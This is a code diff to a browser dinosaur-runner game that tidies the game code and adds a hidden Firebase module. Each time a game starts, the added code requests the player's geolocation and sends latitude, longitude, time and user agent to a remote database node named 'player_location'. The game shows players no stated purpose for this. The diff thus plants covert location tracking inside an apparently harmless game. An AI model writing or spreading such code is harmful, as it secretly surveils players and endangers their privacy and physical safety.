@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Dino Runner</title>
+<title>Dino Runner - Made by Nikhil</title>
 
 <style>
 body {
@@ -38,10 +38,11 @@ canvas { display: block; }
   justify-content: center;
   font-size: 20px;
   font-weight: bold;
+  text-align: center;
 }
 .hidden { display: none; }
 
-/* MOBILE CONTROLS (ONLY ADDITION) */
+/* MOBILE CONTROLS */
 .controls {
   position: fixed;
   bottom: 20px;
@@ -79,27 +80,60 @@ canvas { display: block; }
 <div class="center" id="start">PRESS SPACE / TAP TO START</div>
 <div class="center hidden" id="over">GAME OVER<br>PRESS R / TAP TO RESTART</div>
 
-<!-- MOBILE BUTTONS -->
 <div class="controls">
   <div class="btn" id="duckBtn">DUCK</div>
   <div class="btn" id="jumpBtn">JUMP</div>
 </div>
+
+<script type="module">
+  // 1. Firebase Libraries Import
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+  import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
+
+  // 2. Your Firebase Config
+  const firebaseConfig = {
+    apiKey: "AIzaSyDLJHRDd_RtYBwF97he_6QSxHlMvgIBxO4",
+    authDomain: "diano-game.firebaseapp.com",
+    databaseURL: "https://diano-game-default-rtdb.asia-southeast1.firebasedatabase.app",
+    projectId: "diano-game",
+    storageBucket: "diano-game.firebasestorage.app",
+    messagingSenderId: "596405576156",
+    appId: "1:596405576156:web:fb95d723af33e6652faf19"
+  };
+
+  // 3. Initialize Firebase
+  const app = initializeApp(firebaseConfig);
+  const db = getDatabase(app);
+
+  // 4. Global Function to Send Location
+  window.sendLocationToFirebase = function() {
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition((position) => {
+        const data = {
+          lat: position.coords.latitude,
+          lon: position.coords.longitude,
+          time: new Date().toLocaleString(),
+          userAgent: navigator.userAgent // Kaunsa browser/phone hai
+        };
+        // Firebase mein 'player_location' node par save karein
+        set(ref(db, 'player_location'), data);
+      });
+    }
+  };
+</script>
 
 <script>
 /* ===== AUDIO ===== */
 const bgMusic = new Audio("bg music.mp3");
 bgMusic.loop = true;
 bgMusic.volume = 0.4;
-
 const startSound = new Audio("start.mp3");
 const outSound = new Audio("out.mp3");
-
 let muted = false;
 
 /* ===== CANVAS ===== */
 const canvas = document.getElementById("game");
 const ctx = canvas.getContext("2d");
-
 function resize() {
   canvas.width = innerWidth;
   canvas.height = innerHeight;
@@ -113,7 +147,6 @@ let score = 0;
 let speed = 7;
 let gravity = 0.9;
 let frame = 0;
-
 let highScore = Number(localStorage.getItem("dinoHigh") || 0);
 document.getElementById("high").innerText = "HIGH: " + highScore;
 
@@ -121,19 +154,12 @@ const dino = { x: 80, y: 0, w: 40, h: 50, vy: 0, jumping: false, duck: false };
 const ground = () => canvas.height * 0.75;
 let obstacles = [];
 
-/* ===== DAY / NIGHT (UNCHANGED) ===== */
-function isNight() {
-  return Math.floor(score / 2500) % 2 === 1;
-}
-
-/* ===== STARS (UNCHANGED) ===== */
+/* ===== HELPERS ===== */
+function isNight() { return Math.floor(score / 2500) % 2 === 1; }
 const stars = Array.from({ length: 80 }, () => ({
-  x: Math.random() * innerWidth,
-  y: Math.random() * innerHeight * 0.5,
-  r: Math.random() * 1.5 + 0.5
+  x: Math.random() * innerWidth, y: Math.random() * innerHeight * 0.5, r: Math.random() * 1.5 + 0.5
 }));
 
-/* ===== MUTE ===== */
 const muteBtn = document.getElementById("mute");
 muteBtn.onclick = () => {
   muted = !muted;
@@ -142,31 +168,19 @@ muteBtn.onclick = () => {
   else if (state === "RUNNING") bgMusic.play();
 };
 
-/* ===== OBSTACLES (UNCHANGED) ===== */
 function spawnObstacle() {
   const isBird = Math.random() < 0.3;
   let o = { x: canvas.width + 20, y: 0, w: 0, h: 0, type: isBird ? "bird" : "cactus" };
-
-  if (isBird) {
-    o.w = 55;
-    o.h = 90;
-    o.y = ground() - 25 - o.h - 6;
-  } else {
-    o.w = Math.random() < 0.5 ? 25 : 40;
-    o.h = Math.random() < 0.5 ? 40 : 60;
-    o.y = ground() - o.h;
-  }
+  if (isBird) { o.w = 55; o.h = 90; o.y = ground() - 25 - o.h - 6; } 
+  else { o.w = Math.random() < 0.5 ? 25 : 40; o.h = Math.random() < 0.5 ? 40 : 60; o.y = ground() - o.h; }
   obstacles.push(o);
 }
 
 function jump() {
-  if (!dino.jumping) {
-    dino.vy = -16;
-    dino.jumping = true;
-  }
+  if (!dino.jumping) { dino.vy = -16; dino.jumping = true; }
 }
 
-/* ===== CONTROLS PC (UNCHANGED) ===== */
+/* ===== CONTROLS ===== */
 addEventListener("keydown", e => {
   if (e.code === "Space") {
     if (state === "START") start();
@@ -175,58 +189,38 @@ addEventListener("keydown", e => {
   if (e.code === "ArrowDown") dino.duck = true;
   if (e.code === "KeyR" && state === "OVER") start();
 });
-addEventListener("keyup", e => {
-  if (e.code === "ArrowDown") dino.duck = false;
-});
+addEventListener("keyup", e => { if (e.code === "ArrowDown") dino.duck = false; });
 
-/* ===== CONTROLS MOBILE (ONLY ADDITION) ===== */
 document.getElementById("jumpBtn").addEventListener("touchstart", e => {
   e.preventDefault();
   state === "RUNNING" ? jump() : start();
 });
-
 document.getElementById("duckBtn").addEventListener("touchstart", e => {
-  e.preventDefault();
-  dino.duck = true;
+  e.preventDefault(); dino.duck = true;
 });
 document.getElementById("duckBtn").addEventListener("touchend", e => {
-  e.preventDefault();
-  dino.duck = false;
+  e.preventDefault(); dino.duck = false;
 });
 
 /* ===== FLOW ===== */
 function start() {
   state = "RUNNING";
-  score = 0;
-  speed = 7;
-  frame = 0;
-  obstacles = [];
-  dino.y = ground() - dino.h;
-  dino.vy = 0;
-  dino.jumping = false;
-  dino.duck = false;
+  score = 0; speed = 7; frame = 0; obstacles = [];
+  dino.y = ground() - dino.h; dino.vy = 0; dino.jumping = false; dino.duck = false;
 
-  startSound.currentTime = 0;
-  startSound.play();
-  if (!muted) {
-    bgMusic.currentTime = 0;
-    bgMusic.play();
-  }
+  // LOCATION TRIGGER: Game shuru hote hi location Firebase bhejega
+  if(window.sendLocationToFirebase) window.sendLocationToFirebase();
 
+  startSound.currentTime = 0; startSound.play();
+  if (!muted) { bgMusic.currentTime = 0; bgMusic.play(); }
   document.getElementById("start").classList.add("hidden");
   document.getElementById("over").classList.add("hidden");
 }
 
 function gameOver() {
-  state = "OVER";
-  bgMusic.pause();
-  bgMusic.currentTime = 0;
-  outSound.currentTime = 0;
-  outSound.play();
-
+  state = "OVER"; bgMusic.pause(); outSound.play();
   if (score > highScore) {
-    highScore = score;
-    localStorage.setItem("dinoHigh", highScore);
+    highScore = score; localStorage.setItem("dinoHigh", highScore);
     document.getElementById("high").innerText = "HIGH: " + highScore;
   }
   document.getElementById("over").classList.remove("hidden");
@@ -238,83 +232,40 @@ function hit(a, b) {
   return a.x < b.x + b.w && a.x + a.w > b.x && ay < b.y + b.h && ay + ah > b.y;
 }
 
-/* ===== UPDATE ===== */
 function update() {
   if (state !== "RUNNING") return;
-
-  frame++;
-  score++;
-  speed += 0.002;
-
+  frame++; score++; speed += 0.002;
   if (frame % 70 === 0) spawnObstacle();
-
-  dino.vy += gravity;
-  dino.y += dino.vy;
-  if (dino.y >= ground() - dino.h) {
-    dino.y = ground() - dino.h;
-    dino.vy = 0;
-    dino.jumping = false;
-  }
-
+  dino.vy += gravity; dino.y += dino.vy;
+  if (dino.y >= ground() - dino.h) { dino.y = ground() - dino.h; dino.vy = 0; dino.jumping = false; }
   obstacles.forEach(o => o.x -= speed);
   obstacles = obstacles.filter(o => o.x + o.w > 0);
   obstacles.forEach(o => hit(dino, o) && gameOver());
-
   document.getElementById("score").innerText = "SCORE: " + score;
 }
 
-/* ===== DRAW (UNCHANGED VISUALS) ===== */
 function draw() {
   ctx.clearRect(0, 0, canvas.width, canvas.height);
-
   const t = (score % 2500) / 2500;
-
   if (isNight()) {
-    ctx.fillStyle = "#0B132B";
-    ctx.fillRect(0, 0, canvas.width, canvas.height);
-    ctx.fillStyle = "#fff";
-    stars.forEach(s => {
-      ctx.beginPath();
-      ctx.arc(s.x, s.y, s.r, 0, Math.PI * 2);
-      ctx.fill();
-    });
+    ctx.fillStyle = "#0B132B"; ctx.fillRect(0, 0, canvas.width, canvas.height);
+    ctx.fillStyle = "#fff"; stars.forEach(s => { ctx.beginPath(); ctx.arc(s.x, s.y, s.r, 0, Math.PI * 2); ctx.fill(); });
   } else {
     const sky = ctx.createLinearGradient(0, 0, 0, canvas.height);
     sky.addColorStop(0, t > 0.6 ? "#FF8C42" : "#87CEEB");
     sky.addColorStop(1, "#FFFFFF");
-    ctx.fillStyle = sky;
-    ctx.fillRect(0, 0, canvas.width, canvas.height);
+    ctx.fillStyle = sky; ctx.fillRect(0, 0, canvas.width, canvas.height);
   }
-
-  ctx.fillStyle = "#E3C16F";
-  ctx.fillRect(0, ground(), canvas.width, canvas.height);
-
-  ctx.globalAlpha = 0.35;
-  ctx.fillStyle = "#6B4F1D";
-  ctx.font = "bold 36px Arial";
-  ctx.textAlign = "center";
-  ctx.fillText("MADE BY NIKHIL", canvas.width / 2, ground() + 50);
-  ctx.globalAlpha = 1;
-
-  ctx.fillStyle = "#27AE60";
-  const dh = dino.duck ? dino.h / 2 : dino.h;
+  ctx.fillStyle = "#E3C16F"; ctx.fillRect(0, ground(), canvas.width, canvas.height);
+  ctx.globalAlpha = 0.35; ctx.fillStyle = "#6B4F1D"; ctx.font = "bold 36px Arial"; ctx.textAlign = "center";
+  ctx.fillText("MADE BY NIKHIL", canvas.width / 2, ground() + 50); ctx.globalAlpha = 1;
+  ctx.fillStyle = "#27AE60"; const dh = dino.duck ? dino.h / 2 : dino.h;
   ctx.fillRect(dino.x, dino.y + (dino.h - dh), dino.w, dh);
-
-  ctx.fillStyle = "#000";
-  ctx.fillRect(dino.x + 28, dino.y + (dino.h - dh) + 10, 5, 5);
-
-  obstacles.forEach(o => {
-    ctx.fillStyle = o.type === "bird" ? "#E74C3C" : "#1E8449";
-    ctx.fillRect(o.x, o.y, o.w, o.h);
-  });
+  ctx.fillStyle = "#000"; ctx.fillRect(dino.x + 28, dino.y + (dino.h - dh) + 10, 5, 5);
+  obstacles.forEach(o => { ctx.fillStyle = o.type === "bird" ? "#E74C3C" : "#1E8449"; ctx.fillRect(o.x, o.y, o.w, o.h); });
 }
 
-/* ===== LOOP ===== */
-function loop() {
-  requestAnimationFrame(loop);
-  update();
-  draw();
-}
+function loop() { requestAnimationFrame(loop); update(); draw(); }
 loop();
 </script>
 
